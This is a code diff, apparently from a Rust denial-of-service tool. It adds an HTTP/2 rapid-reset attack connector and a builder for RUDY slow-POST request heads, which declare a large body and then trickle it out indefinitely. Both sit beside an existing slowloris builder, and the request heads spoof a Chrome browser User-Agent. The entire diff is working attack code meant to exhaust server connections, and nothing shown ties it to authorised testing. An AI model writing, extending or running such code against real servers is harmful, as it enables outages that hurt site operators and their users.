@@ -29,6 +29,8 @@ pub struct Target {
     pub path: String,
     pub server_name: ServerName<'static>,
     pub connector: TlsConnector,
+    /// TLS connector advertising ALPN `h2`, for the HTTP/2 rapid-reset vector.
+    pub h2_connector: TlsConnector,
 }
 
 impl Target {
@@ -64,8 +66,25 @@ impl Target {
             addr,
             path,
             server_name,
-            connector: build_connector(),
+            connector: build_connector(&[]),
+            h2_connector: build_connector(&[b"h2".to_vec()]),
         })
+    }
+
+    /// Open one TLS connection with ALPN `h2` negotiated, returning the raw
+    /// stream for the h2 client handshake. Used by the rapid-reset vector.
+    pub async fn connect_h2(&self) -> Result<TlsStream<TcpStream>> {
+        let tcp = tokio::time::timeout(CONNECT_TIMEOUT, TcpStream::connect(self.addr))
+            .await
+            .context("connect timed out")??;
+        tcp.set_nodelay(true).ok();
+        let stream = tokio::time::timeout(
+            CONNECT_TIMEOUT,
+            self.h2_connector.connect(self.server_name.clone(), tcp),
+        )
+        .await
+        .context("TLS(h2) handshake timed out")??;
+        Ok(stream)
     }
 
     /// Open one connection (TCP, plus TLS handshake when applicable).
@@ -89,12 +108,14 @@ impl Target {
 }
 
 /// One shared rustls config for the whole run — Mozilla roots, ring provider.
-fn build_connector() -> TlsConnector {
+/// `alpn` sets advertised ALPN protocols (empty = none).
+fn build_connector(alpn: &[Vec<u8>]) -> TlsConnector {
     let mut roots = RootCertStore::empty();
     roots.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
-    let config = ClientConfig::builder()
+    let mut config = ClientConfig::builder()
         .with_root_certificates(roots)
         .with_no_client_auth();
+    config.alpn_protocols = alpn.to_vec();
     TlsConnector::from(Arc::new(config))
 }
 
@@ -207,6 +228,20 @@ pub fn build_slowloris_head(host: &str, path: &str) -> Arc<[u8]> {
          Host: {host}\r\n\
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0 Safari/537.36\r\n\
          Accept: text/html,*/*;q=0.8\r\n"
+    );
+    head.into_bytes().into()
+}
+
+/// Pre-build the RUDY POST head: complete headers declaring a large body we
+/// then trickle forever without ever finishing. Body bytes are sent separately.
+pub fn build_rudy_head(host: &str, path: &str, content_length: usize) -> Arc<[u8]> {
+    let head = format!(
+        "POST {path} HTTP/1.1\r\n\
+         Host: {host}\r\n\
+         User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0 Safari/537.36\r\n\
+         Content-Type: application/x-www-form-urlencoded\r\n\
+         Content-Length: {content_length}\r\n\
+         Connection: keep-alive\r\n\r\n"
     );
     head.into_bytes().into()
 }
